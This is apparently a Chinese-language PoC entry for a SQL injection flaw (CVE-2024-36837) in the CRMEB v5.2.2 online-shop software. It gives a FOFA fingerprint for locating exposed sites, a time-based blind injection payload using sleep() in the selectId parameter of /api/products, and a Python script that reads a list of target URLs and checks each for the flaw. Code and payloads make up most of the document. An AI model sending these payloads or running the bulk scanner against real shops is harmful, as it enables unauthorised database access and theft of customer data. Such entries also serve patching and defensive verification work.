## CRMEB开源商城v5.2.2存在sql注入漏洞

CRMEB v.5.2.2 中的 SQL 注入漏洞允许远程攻击者通过 ProductController.php 文件中的 getProductList 函数获取敏感信息。

## fofa

```
icon_hash="-847565074"
```

## poc

```
/api/products?limit=20&priceOrder=&salesOrder=&selectId=)
/api/products?limit=20&priceOrder=&salesOrder=&selectId=0*if(now()=sysdate(),sleep(6),0) 
```

![image-20240616153608225](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406161536278.png)

![image-20240616153711514](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406161537576.png)

```python
import requests
def check_vulnerability(url):
    # Remove trailing slash if present
    if url.endswith('/'):
        url = url[:-1]
    # Construct the URL with the required endpoint
    test_url = f"{url}/api/products?limit=20&priceOrder=&salesOrder=&selectId=)"
    try:
        response = requests.get(test_url)
        # Check if the response contains the specific string indicating a vulnerability
        if 'PDOConnection.php' in response.text:
            print(f"\033[31m[HIGH RISK]\033[0m Vulnerability found in: {url}")
        else:
            print(f"\033[32m[SAFE]\033[0m No vulnerability found in: {url}")
    except requests.RequestException as e:
        print(f"\033[33m[ERROR]\033[0m Could not connect to {url}. ")#Error: {e}")
def main():
    # Read URLs from url.txt
    with open('url.txt', 'r') as file:
        urls = file.readlines()

    for url in urls:
        url = url.strip()  # Remove any leading/trailing whitespace characters
        if not url.startswith('http'):
            url = 'http://' + url  # Add http scheme if missing
        check_vulnerability(url)
if __name__ == "__main__":
    main()
```



## 漏洞来源

- https://github.com/phtcloud-dev/CVE-2024-36837/blob/main/CVE-2024-36837.py
- https://7nkdkj-my.sharepoint.com/:w:/g/personal/krypt0n_7nkdkj_onmicrosoft_com/Ea8dW8YuldRMqgCy7KHjnxABTJCVPLShHIJfqQk684mD3A?e=0qmN7t